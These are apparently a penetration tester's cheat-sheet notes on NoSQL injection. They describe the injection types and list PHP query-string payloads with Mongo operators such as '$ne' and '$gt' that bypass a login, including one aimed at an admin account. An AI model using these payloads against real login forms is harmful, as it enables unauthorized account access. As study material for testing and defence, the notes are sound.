# NoSQL
## Types of injections
- **In-Band** - the attacker can use the same channel of communication to exploit a NoSQL injection and receive the results
- **Blind** - This is when the attacker does not receive any direct results from the NoSQL injection, but they can infer results based on how the server responds
- **Boolean** - Boolean-based is a subclass of blind injections, which is a technique where attackers can force the server to evaluate a query and return one result or the other if it is True or False
- **Time-Based** - Time-based is the other subclass of blind injections, which is when attackers make the server wait for a specific amount of time before responding, usually to indicate if the query is evaluated as True or False

## PHP Syntax
|PHP query|Mongo Query|Description|
|-|-|-|
|`param[$op]=val`|`param: {$op: val}`||
|`email[$ne]=test@test.com`|`email: {$ne: "test@test.com"}`||
|`email=admin%40mangomail.com&password[$ne]=x`|`$and:[{email:"admin@mangomail.com"}, {password: {$ne: x}}]`|This assumes we know the admin's email and we wanted to target them directly|
|`email[$gt]=&password[$gt]=`|`$and: [{email: {$gt:0}}, {password: {$gt:0}}]`|Any string is 'greater than' an empty string|
|`email[$gte]=&password[$gte]=`|`$and: [{email: {$gte:0}}, {password: {$gte:0}}]`|Any string is 'greater than' an empty string|

## NoSQL queries
|Query|Description|
|-|-|
|`name: {$ne: 'doesntExist'}`|Assuming doesntExist doesn't match any documents' names, this will match all documents|
